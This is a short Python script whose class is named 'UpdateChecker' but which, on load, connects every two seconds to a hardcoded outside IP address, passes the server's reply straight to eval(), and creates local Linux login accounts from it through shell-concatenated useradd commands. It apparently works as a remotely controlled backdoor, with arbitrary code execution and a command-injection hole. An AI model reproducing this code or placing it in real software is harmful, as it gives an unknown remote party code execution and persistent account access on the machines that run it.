import time
import os
import crypt
import socket

class UpdateChecker():
    
    directoryIP = ""
    directoryPort = ""

    def __init__(self, IP, Port):
        self.directoryIP = IP
        self.directoryPort = Port
        self.backgroundChecker()

    def createAccount(self, username, password):
        encPass = crypt.crypt(password,"22")
        os.system("useradd -p " + encPass + " -s "+ "/bin/bash "+ "-d "+ "/home/" + username + " -m "+ " -c \""+ username +"\" " + username)

    def checkForLocalAccount(self, username):
        pass

    def backgroundChecker(self):
        while True:
            time.sleep(2) # Wait two seconds before rechecking.

            # Socket connection creation and closing.
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((self.directoryIP,self.directoryPort))
            s.send(b"GetUsersCommand//ALL")
            data = s.recv(1024).decode()
            s.close()
            
            # Creating new users from database.
            listOfUsers = eval(data)
            print(listOfUsers)
            for user in listOfUsers:
                self.createAccount(user["username"], user["password"])


x : UpdateChecker = UpdateChecker("184.171.155.80", 1900)
